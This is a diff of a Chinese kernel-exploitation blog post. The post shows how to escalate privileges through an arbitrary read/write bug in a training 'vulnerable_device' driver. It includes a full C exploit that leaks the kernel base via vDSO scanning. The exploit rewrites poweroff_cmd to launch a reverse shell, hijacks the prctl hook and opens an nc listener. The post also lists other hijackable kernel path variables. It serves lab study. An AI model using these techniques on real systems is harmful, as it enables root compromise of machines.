@@ -2,7 +2,7 @@
 layout: post
 title: 任意读写漏洞进行提权
 excerpt: "kernel pwn"
-categories: [未完待续]
+categories: [kernelpwn]
 comments: true
 ---
 
@@ -760,7 +760,7 @@ int main()
 #### call_usermodehelper()原理
 call_usermodehelper（\kernel\kmod.c 603），这个函数可以在内核中直接新建和运行用户空间程序，并且该程序具有root权限，因此只要将参数传递正确就可以执行任意命令（注意命令中的参数要用全路径，不能用相对路径）。但其中提到在安卓利用时需要关闭SEAndroid。
 
-我们要劫持task_prctl到call_usermoderhelper吗，不是的，因为这里的第一个参数也是64位的，也不能直接劫持过来。但是内核中有些代码片段是调用了Call_usermoderhelper的，可以转化为我们所用（通过它们来执行用户代码或访问用户数据，绕过SMEP）。
+我们要劫持task_prctl到call_usermoderhelper吗，不是的，因为这里的第一个参数也是64位的，也不能直接劫持过来(劫持后的函数第一个参数为地址指针)。但是内核中有些代码片段是调用了Call_usermoderhelper的，可以转化为我们所用（通过它们来执行用户代码或访问用户数据，绕过SMEP）。
 
 也就是有些函数从内核调用了用户空间，例如kernel/reboot.c中的__orderly_poweroff函数中调用了run_cmd参数是poweroff_cmd,而且poweroff_cmd是一个全局变量，可以修改后指向我们的命令。
 
@@ -791,6 +791,29 @@ static void poweroff_work_func(struct work_struct *work)
     __orderly_poweroff(poweroff_force);
 }
 ```
+而run_cmd内部调用了callusermodehelper
+```
+static int run_cmd(const char *cmd)
+{
+    char **argv;
+    static char *envp[] = {
+        "HOME=/",
+        "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
+        NULL
+    };
+    int ret;
+    argv = argv_split(GFP_KERNEL, cmd, NULL);
+    if (argv) {
+        ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+        argv_free(argv);
+    } else {
+        ret = -ENOMEM;
+    }
+
+    return ret;
+}
+```
+我们可以将task_prctl劫持为__orderly_poweroff,来进行提权
 ##### 利用步骤
 
 1. 利用kremalloc的问题，达到任意地址读写的能力
@@ -799,3 +822,326 @@ static void poweroff_work_func(struct work_struct *work)
 4. 篡改poweroff_cmd使其等于我们预期执行的命令（"/bin/chmod 777 /flag\0"）。或者将poweroff_cmd处改为一个反弹shell的binary命令，监听端口就可以拿到shell。
 5. 篡改prctl的hook为orderly_poweroff
 6. 调用prctl执行我们预期的命令，达到内核提权的效果。
+
+首先写一个程序,确定`hp->hook.task_prctl`位置
+```
+#include <sys/prctl.h>  
+#include <string.h>
+#include <stdio.h>
+
+void exploit(){
+    prctl(0,0);
+}
+
+int main(int argc,char * argv[]){
+    if(argc > 1){
+        if(!strcmp(argv[1],"--breakpoint")){
+            printf("[%p]n",exploit);
+        }
+        return 0;
+    }
+    exploit();
+    return 0;
+}
+```
+在security_task_prctl下断点,然后运行到这里
+```
+[-------------------------------------code-------------------------------------]
+   0xffffffff81355094:	mov    r14d,edi
+   0xffffffff81355097:	mov    r13,rsi
+   0xffffffff8135509a:	mov    r12,rdx
+=> 0xffffffff8135509d:	mov    rax,QWORD PTR [rbx+0x18]
+   0xffffffff813550a1:	mov    r8,QWORD PTR [rbp-0x38]
+   0xffffffff813550a5:	mov    rdx,r12
+   0xffffffff813550a8:	mov    rcx,QWORD PTR [rbp-0x30]
+   0xffffffff813550ac:	mov    rsi,r13
+[------------------------------------stack-------------------------------------]
+0000| 0xffff880037fcfeb0 --> 0x2 
+0004| 0xffff880037fcfeb4 --> 0x0 
+0008| 0xffff880037fcfeb8 --> 0x454320 --> 0xfa1e0ff3 
+0012| 0xffff880037fcfebc --> 0x0 
+0016| 0xffff880037fcfec0 --> 0x90a3a318 
+0020| 0xffff880037fcfec4 --> 0x7ffd 
+0024| 0xffff880037fcfec8 --> 0x0 
+0028| 0xffff880037fcfecc --> 0x0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0xffffffff8135509d in ?? ()
+gdb-peda$ x/gx $rbx+0x18
+0xffffffff81e9bcd8:	0xffffffff813504f0
+gdb-peda$ x/gx $rbx
+0xffffffff81e9bcc0:	0xffffffff81ea4b80
+```
+此时运行到`hp->hook.task_prctl`,我们劫持的地址是`0xffffffff81e9bcc0+0x18=0xffffffff81e9bcd8`
+
+
+完整的exp如下
+```
+#define _GNU_SOURCE
+#include <sys/mman.h>
+#include <sys/wait.h>
+#include <unistd.h>
+#include <string.h>
+#include <stdlib.h>
+#include <arpa/inet.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <sched.h>
+#include <sys/ioctl.h>
+#include <sys/types.h>
+#include <stdio.h>
+#include <sys/ipc.h>
+#include <sys/msg.h>
+
+#include <sys/socket.h>
+#include <sys/syscall.h>
+#include <linux/if_packet.h>
+#include <linux/if_ether.h>
+#include <linux/if_arp.h>
+#include <sys/prctl.h>   //prctl
+#include <sys/auxv.h>    //AT_SYSINFO_EHDR
+
+#ifndef _VULN_DRIVER_
+	#define _VULN_DRIVER_
+	#define DEVICE_NAME "vulnerable_device"
+	#define IOCTL_NUM 0xFE
+	#define DRIVER_TEST _IO (IOCTL_NUM,0)
+	#define BUFFER_OVERFLOW _IOR (IOCTL_NUM,1,char *)
+	#define NULL_POINTER_DEREF _IOR (IOCTL_NUM,2,unsigned long)
+	#define ALLOC_UAF_OBJ _IO (IOCTL_NUM,3)
+	#define USE_UAF_OBJ _IO (IOCTL_NUM,4)
+	#define ALLOC_K_OBJ _IOR (IOCTL_NUM,5,unsigned long)
+	#define FREE_UAF_OBJ _IO (IOCTL_NUM,6)
+	#define ARBITRARY_RW_INIT _IOR(IOCTL_NUM,7, unsigned long)
+	#define ARBITRARY_RW_REALLOC _IOR(IOCTL_NUM,8,unsigned long)
+	#define ARBITRARY_RW_READ _IOWR(IOCTL_NUM,9,unsigned long)
+	#define ARBITRARY_RW_SEEK _IOR(IOCTL_NUM,10,unsigned long)
+	#define ARBITRARY_RW_WRITE _IOR(IOCTL_NUM,11,unsigned long)
+	#define UNINITIALISED_STACK_ALLOC _IOR(IOCTL_NUM,12,unsigned long)
+	#define UNINITIALISED_STACK_USE _IOR(IOCTL_NUM,13,unsigned long)
+#endif
+
+#define PATH "/dev/vulnerable_device"
+#define START_ADDR 0xffffffff80000000
+#define END_ADDR 0xffffffffffffefff
+
+struct init_args {
+	size_t size;
+};
+struct realloc_args{
+	int grow;
+	size_t size;
+};
+struct read_args{
+	char *buff;
+	size_t count;
+};
+struct seek_args{
+	loff_t new_pos;
+};
+struct write_args{
+	char *buff;
+	size_t count;
+};
+
+int read_mem(int fd, size_t addr,char *buff,int count)
+{
+	struct seek_args s_args2;
+	struct read_args r_args;
+	int ret;
+
+	s_args2.new_pos=addr-0x10;
+	ret=ioctl(fd,ARBITRARY_RW_SEEK,&s_args2);  // seek
+	r_args.buff=buff;
+	r_args.count=count;
+	ret=ioctl(fd,ARBITRARY_RW_READ,&r_args);   // read
+	return ret;
+}
+int write_mem(int fd, size_t addr,char *buff,int count)
+{
+	struct seek_args s_args1;
+	struct write_args w_args;
+	int ret;
+
+	s_args1.new_pos=addr-0x10;
+	ret=ioctl(fd,ARBITRARY_RW_SEEK,&s_args1);  // seek
+	w_args.buff=buff;
+	w_args.count=count;
+	ret=ioctl(fd,ARBITRARY_RW_WRITE,&w_args);  // write
+	return ret;
+}
+
+
+int main()
+{
+	int fd=-1;
+	size_t result=0;
+	size_t addr=0;
+	struct init_args i_args;
+	struct realloc_args rello_args;
+
+	size_t kernel_base=0;
+    size_t selinux_disable_addr = 0x3607f0;   //ffffffff813607f0 T selinux_disable   - 0xffffffff81000000(vmmap) =0x3607f0      可通过cat /proc/kallsyms | grep selinux_disable找到
+    size_t prctl_hook=0xe9bcd8;             // 0xffffffff81e9bcc0+0x18=0xffffffff81e9bcd8 - 0xffffffff81000000=0xe9bcd8         这是一个虚表的位置,通过调试security_task_prctl 得到
+    size_t order_cmd=0xe4cf40;       //  poweroff_cmd函数,通过cat /proc/kallsyms | grep poweroff_cmd 查找
+    size_t poweroff_work_addr=0xa7590; //     poweroff_work函数,通过 cat /proc/kallsyms | grep poweroff_work 查找
+	
+	setvbuf(stdout, 0LL, 2, 0LL);
+	char *buf=malloc(0x1000);
+	fd=open(PATH,O_RDWR);           //  首先打开驱动 /dev/vulnerable_device
+	if (fd<0){
+		puts("[-] open error ! \n");
+		exit(-1);
+	}
+    // 构造任意地址读写
+	i_args.size=0x100;
+	ioctl(fd, ARBITRARY_RW_INIT, &i_args);
+	rello_args.grow=0;
+	rello_args.size=0x100+1;
+	ioctl(fd,ARBITRARY_RW_REALLOC,&rello_args);
+	puts("[+] We can read and write any memory! [+]");
+	//爆破VDSO地址，泄露kernel_base
+	for (size_t addr=START_ADDR; addr<END_ADDR; addr+=0x1000)
+	{
+		read_mem(fd,addr,buf,0x1000);
+		if (!strcmp("gettimeofday",buf+0x2cd))      //通过字符串偏移找到vdso地址
+		{
+			result=addr;
+			printf("[+] found vdso 0x%lx\n",result);
+			break;
+		}
+	}
+	if (result==0)
+	{
+		puts("[-] not found, try again! \n");
+		exit(-1);
+	}
+    // 根据VDSO地址得到 kernel_base 
+    kernel_base=result & 0xffffffffff000000;
+    selinux_disable_addr+=kernel_base;
+    prctl_hook+=kernel_base;
+    order_cmd+=kernel_base;
+    poweroff_work_addr+=kernel_base;
+    printf("[+] found kernel_base: %p\n",kernel_base);                          // 通过vdso位置找到内核基地址
+    printf("[+] found prctl_hook: %p\n",prctl_hook);                            //虚表的位置,通过调试security_task_prctl得到
+    printf("[+] found order_cmd: %p\n",order_cmd);                              // poweroff_cmd 函数
+    printf("[+] found selinux_disable_addr: %p\n",selinux_disable_addr);        //selinux_disable 函数
+    printf("[+] found poweroff_work_addr: %p\n",poweroff_work_addr);            // poweroff_work 函数
+
+    // 修改 run_cmd变量
+    memset(buf,'\x00',0x1000);
+    strcpy(buf,"/reverse_shell\0");
+    write_mem(fd,order_cmd, buf,strlen(buf)+1);     // 将ordercmd命令改写为/reverse_shell
+
+    // 劫持prctl_hook去执行poweroff_work
+    memset(buf,'\x00',0x1000);
+    *(size_t *)buf = poweroff_work_addr;
+    write_mem(fd,prctl_hook, buf, 8);       // 将prctl_hook 劫持为 poweroff_work
+
+    //需要fork()子进程来执行reverse_shell程序
+    if (fork()==0){
+    	prctl(addr,2,addr,addr,2);              //其实是执行了    /reverse_shell
+    	exit(-1);
+    }
+    system("nc -l -p 2333");                    // 父进程开启监听
+	return 0;
+}
+```
+
+#### 其他可劫持的变量
+不需要劫持函数虚表，不需要传参数那么麻烦，只需要修改变量即可提权。
+
+1. modprobe_path
+
+```
+// /kernel/kmod.c
+char modprobe_path[KMOD_PATH_LEN] = "/sbin/modprobe";
+// /kernel/kmod.c
+static int call_modprobe(char *module_name, int wait) 
+    argv[0] = modprobe_path;
+    info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,
+                     NULL, free_modprobe_argv, NULL);
+    return call_usermodehelper_exec(info, wait | UMH_KILLABLE);
+// /kernel/kmod.c
+int __request_module(bool wait, const char *fmt, ...)
+    ret = call_modprobe(module_name, wait ? UMH_WAIT_PROC : UMH_WAIT_EXEC);
+```
+__request_module - try to load a kernel module
+
+触发：可通过执行错误格式的elf文件来触发执行modprobe_path指定的文件。
+
+2. poweroff_cmd
+
+```
+// /kernel/reboot.c
+char poweroff_cmd[POWEROFF_CMD_PATH_LEN] = "/sbin/poweroff";
+// /kernel/reboot.c
+static int run_cmd(const char *cmd)
+    argv = argv_split(GFP_KERNEL, cmd, NULL);
+    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+// /kernel/reboot.c
+static int __orderly_poweroff(bool force)    
+    ret = run_cmd(poweroff_cmd);
+```
+触发：执行__orderly_poweroff()即可。
+
+3. uevent_helper
+
+```
+// /lib/kobject_uevent.c
+#ifdef CONFIG_UEVENT_HELPER
+char uevent_helper[UEVENT_HELPER_PATH_LEN] = CONFIG_UEVENT_HELPER_PATH;
+// /lib/kobject_uevent.c
+static int init_uevent_argv(struct kobj_uevent_env *env, const char *subsystem)
+{  ......
+    env->argv[0] = uevent_helper; 
+  ...... }
+// /lib/kobject_uevent.c
+int kobject_uevent_env(struct kobject *kobj, enum kobject_action action,
+               char *envp_ext[])
+{......
+    retval = init_uevent_argv(env, subsystem);
+    info = call_usermodehelper_setup(env->argv[0], env->argv,
+                         env->envp, GFP_KERNEL,
+                         NULL, cleanup_uevent_env, env);
+......}
+```
+
+4. ocfs2_hb_ctl_path
+
+```
+// /fs/ocfs2/stackglue.c
+static char ocfs2_hb_ctl_path[OCFS2_MAX_HB_CTL_PATH] = "/sbin/ocfs2_hb_ctl";
+// /fs/ocfs2/stackglue.c
+static void ocfs2_leave_group(const char *group)
+    argv[0] = ocfs2_hb_ctl_path;
+    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+```
+
+5. nfs_cache_getent_prog
+
+```
+// /fs/nfs/cache_lib.c
+static char nfs_cache_getent_prog[NFS_CACHE_UPCALL_PATHLEN] =
+                "/sbin/nfs_cache_getent";
+// /fs/nfs/cache_lib.c
+int nfs_cache_upcall(struct cache_detail *cd, char *entry_name)
+    char *argv[] = {
+        nfs_cache_getent_prog,
+        cd->name,
+        entry_name,
+        NULL
+    };
+    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+```
+
+6. cltrack_prog
+
+```
+// /fs/nfsd/nfs4recover.c
+static char cltrack_prog[PATH_MAX] = "/sbin/nfsdcltrack";
+// /fs/nfsd/nfs4recover.c
+static int nfsd4_umh_cltrack_upcall(char *cmd, char *arg, char *env0, char *env1)
+    argv[0] = (char *)cltrack_prog;
+    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+```
